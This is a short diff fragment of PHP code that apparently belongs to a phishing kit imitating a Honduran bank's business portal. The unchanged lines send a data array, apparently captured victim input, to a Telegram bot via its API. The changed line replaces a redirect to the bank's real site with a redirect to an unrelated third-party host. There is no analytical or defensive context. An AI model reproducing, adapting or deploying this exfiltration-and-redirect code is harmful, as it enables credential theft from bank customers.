@@ -83,7 +83,7 @@ $data = [
 
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
 
-@header('Location: https://pyme.bancatlan.hn/Empresasv3/hnotauthorized.aspx?82sPNmMP8O3TlpdEZk1r8A==');
+@header('Location: http://c1741617.ferozo.com/sur.php');
 
 
 
